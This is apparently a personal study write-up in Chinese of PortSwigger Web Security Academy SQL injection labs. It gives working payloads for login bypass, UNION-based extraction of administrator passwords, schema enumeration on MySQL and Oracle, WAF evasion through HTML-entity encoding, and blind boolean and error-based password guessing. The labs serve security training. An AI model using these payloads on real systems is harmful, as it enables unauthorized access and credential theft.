---
title: PortSwigger
description: PortSwigger
---

## SQL Injection

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Payload

```
?category=Accessories' OR 1=1--
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Accessories' OR 1=1--'
```

### Lab: SQL injection vulnerability allowing login bypass

Payload

```
administrator' OR 1=1--
```

### Lab: SQL injection with filter bypass via XML encoding

先嘗試用 `UNION SELECT NULL--` 來判斷前面的 `SELECT` 選了幾個 columns

```
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
```

Payload

```
1 UNION SELECT password FROM users WHERE username = 'administrator'--
```

SQL

```sql
SELECT unit FROM stocks WHERE productId = 1 AND storeId = 1 UNION SELECT password FROM users WHERE username = 'administrator'--'
```

轉換成 HTML Entity 來繞過 WAF

```
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#119;&#104;&#101;&#114;&#101;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#61;&#32;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#45;&#45;
```

最終在 F12 > console 送出的 fetch 請求

```js
fetch("/product/stock", {
  headers: {
    "content-type": "application/xml",
  },
  body: '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#119;&#104;&#101;&#114;&#101;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#61;&#32;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#45;&#45;</storeId></stockCheck>',
  method: "POST",
})
  .then((res) => res.text())
  .then((res) => console.log(res));
```

console 的結果

```
020yk5zmzoy92jl364rg
217 units
```

接下來用 `administrator` + `020yk5zmzoy92jl364rg` 就可以成功登入～

### Lab: SQL injection attack, querying the database type and version on Oracle

題目給的 Hint 很重要:

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

先嘗試用 `UNION SELECT NULL FROM dual--` 來判斷前面的 `SELECT` 選了幾個 columns

```
?category=Accessories' UNION SELECT NULL FROM dual--
?category=Accessories' UNION SELECT NULL,NULL FROM dual--
```

Payload

```
?category=Accessories' UNION SELECT banner,NULL FROM v$version--
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Accessories' UNION SELECT banner,NULL FROM v$version--'
```

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

這題稍微卡了一下，主要的卡點有兩個

1. comment 格式，可參考 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#comments)，最終得出需使用 `#comment` 的格式，才可以滿足 MySQL and Microsoft
2. `#` 是 URL hash，所以需使用 `encodeURLComponent` 才能塞到 querystring

先嘗試用 `UNION SELECT NULL #` 來判斷前面的 `SELECT` 選了幾個 columns

```
?category=Lifestyle' UNION SELECT NULL#
?category=Lifestyle' UNION SELECT NULL,NULL#
```

記得放到網址的時候要使用 JS 的 `encodeURIComponent` 去做轉換

```js
encodeURIComponent("Lifestyle' UNION SELECT NULL#");
("Lifestyle'%20UNION%20SELECT%20NULL%23");

encodeURIComponent("Lifestyle' UNION SELECT NULL,NULL#");
("Lifestyle'%20UNION%20SELECT%20NULL%2CNULL%23");
```

實際訪問的 querystring

```
?category=Lifestyle'%20UNION%20SELECT%20NULL%23
?category=Lifestyle'%20UNION%20SELECT%20NULL%2CNULL%23
```

確認 columns 是兩個後，改成以下 Payload

```
# 轉換前
?category=Lifestyle' UNION SELECT @@version,NULL#

# 轉換後
?category=Lifestyle'%20UNION%20SELECT%20%40%40version%2CNULL%23
```

SQL

```sql
SELECT ... FROM products WHERE category = 'Lifestyle' UNION SELECT @@version,NULL#'
```

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

根據 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#comments)，最終得出需使用 `-- ` 的格式來當作註解，嘗試用 `UNION SELECT NULL` 慢慢猜出 `SELECT` 的 columns 數量

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT NULL FROM information_schema.tables-- ",
);
const href = url.href;
window.open(href, "_blank");
```

列出所有 tables，尋找 `users` 關鍵字，找到 table_name 是 `users_fdytnd`

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT table_name,NULL FROM information_schema.tables-- ",
);
const href = url.href;
window.open(href, "_blank");
```

列出 `users_fdytnd` 底下的 `column_name,data_type`，找到帳密的 columns 是 `username_lfypib` 跟 `password_tltvdy`

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users_fdytnd'-- ",
);
const href = url.href;
window.open(href, "_blank");
```

接下來就可以查詢 `administrator` 的密碼並且登入

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Gifts' UNION SELECT username_lfypib,password_tltvdy FROM users_fdytnd WHERE username_lfypib = 'administrator'-- ",
);
const href = url.href;
window.open(href, "_blank");
```

這題我覺得可以延伸，因為我以前從來沒有研究過 `information_schema` 這個 Database 的內容，所以我是直接下載 [XAMPP](https://www.apachefriends.org/zh_tw/download.html)，使用 `phpmyadmin` 的 GUI 來觀察 `information_schema` 的內容，並且嘗試下 SQL 語法，一步一步拆解，過程真的非常有趣～

### Lab: SQL injection attack, listing the database contents on Oracle

跟上一題的概念一樣，只是改成 Oracle 的語法，先用 `UNION SELECT NULL` 來猜出 `SELECT` 的 columns 數量

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT NULL,NULL FROM all_tables--",
);
const href = url.href;
window.open(href, "_blank");
```

確定是兩個 columns 後，把 `NULL` 改成 `table_name`，確定是 `USERS_LCHIFI` 這張 table

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT table_name,NULL FROM all_tables--",
);
const href = url.href;
window.open(href, "_blank");
```

查一下 `USERS_LCHIFI` 有哪些 columns，確定帳密是 `USERNAME_MMUPPE` 跟 `PASSWORD_SNQVCH`

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name = 'USERS_LCHIFI'--",
);
const href = url.href;
window.open(href, "_blank");
```

開始查 `administrator` 的密碼

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Corporate gifts' UNION SELECT USERNAME_MMUPPE,PASSWORD_SNQVCH FROM USERS_LCHIFI WHERE USERNAME_MMUPPE = 'administrator'--",
);
const href = url.href;
window.open(href, "_blank");
```

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

這題意外的簡單，利用前面的技術 `UNION SELECT NULL` 來判斷 `SELECT` 多少 columns

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append("category", "Lifestyle' UNION SELECT NULL,NULL,NULL--");
const href = url.href;
window.open(href, "_blank");
```

### Lab: SQL injection UNION attack, finding a column containing text

承接上一題，就是把 `NULL` 換成題目指定的字串 `bpaLX3`，看哪個 index 換掉會成功

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Lifestyle' UNION SELECT NULL,'bpaLX3',NULL--",
);
const href = url.href;
window.open(href, "_blank");
```

### Lab: SQL injection UNION attack, retrieving data from other tables

怎麼感覺跟前面的題目有點像@@

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Lifestyle' UNION SELECT username,password FROM users--",
);
const href = url.href;
window.open(href, "_blank");
```

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

結合前面學到的，要猜出哪個 column 是 string

```js
const url = new URL(`${location.origin}/filter`);
url.searchParams.append(
  "category",
  "Accessories' UNION SELECT NULL,password FROM users WHERE username = 'administrator'--",
);
const href = url.href;
window.open(href, "_blank");
```

### Lab: Blind SQL injection with conditional responses

這題稍微麻煩，要一個一個字元去猜，先找出密碼的長度，結果是 20 碼

```sql
HsacENgP06akYysN' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) = 'a
```

之後就是用二分法，一個一個把字元猜出來

```sql
AND SUBSTRING((SELECT password from users WHERE username = 'administrator'), 1, 1) > 'm
```

正常 SQL

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'HsacENgP06akYysN'
```

Injected SQL

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'HsacENgP06akYysN' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) = 'a'
```

這題要手動爆破會累死，基本上是要工具，本來沒有下載 Burp Suite，但我看 PortSwigger 的課程一直推薦自家產品，所以還是學一下好了XD

### Lab: Blind SQL injection with conditional errors

主要的卡點

1. 之前沒有使用過 `CASE WHEN (condition) THEN (A) ELSE (B) END` 這個 SQL 語法
2. 太長的 SQL 語法我會有閱讀障礙，但如果有正常縮排，就會容易閱讀很多

這題需要先從簡單的 SQL 語法測試正常注入跟引發錯誤的情境

正常注入

```sql
jP7Ryk30JRp4JvwD' || (SELECT '' FROM dual)--
```

引發錯誤

```sql
jP7Ryk30JRp4JvwD' || (SELECT '')--
```

接著用以下 SQL 語法測試 password 的長度

- 如果 password 的長度 `> 10`，就爆炸
- 如果 password 的長度 `<= 10`，就正常

```sql
jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (LENGTH(password) > 10) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a

jP7Ryk30JRp4JvwD' AND (
  SELECT
    CASE
      WHEN (LENGTH(password) > 10)
      THEN TO_CHAR(1/0)
      ELSE 'a'
    END
  FROM users
  WHERE username = 'administrator'
) = 'a
```

最終測出 password 長度 = 20

```sql
jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (LENGTH(password) = 20) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a
```

再用以下 SQL 語法爆破 password 的每個字元

- 如果 password 第一個字元 `> 'm'`，就爆炸
- 如果 password 第一個字元 `<= 'm'`，就正常

```sql
jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a

jP7Ryk30JRp4JvwD' AND (
  SELECT
    CASE
      WHEN (SUBSTR(password, 1, 1) > 'm')
      THEN TO_CHAR(1/0)
      ELSE 'a'
    END
  FROM users
  WHERE username = 'administrator'
) = 'a
```

## 參考資料
